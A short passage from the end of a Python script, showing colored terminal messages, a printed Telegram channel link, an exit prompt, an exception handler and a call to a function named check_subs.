					print(f"{B}● {Y}●[{B}!!{B}]{B}└──● {Y}Follow This Link ● https://t.me/Priscydhon")
					exit()
				else:
					print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}THANKS FOR USING OUR SCRIPT")
					input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Exit")
					exit()
	except Exception as e:
		print(f"{R}Error ● {e}")


check_subs()




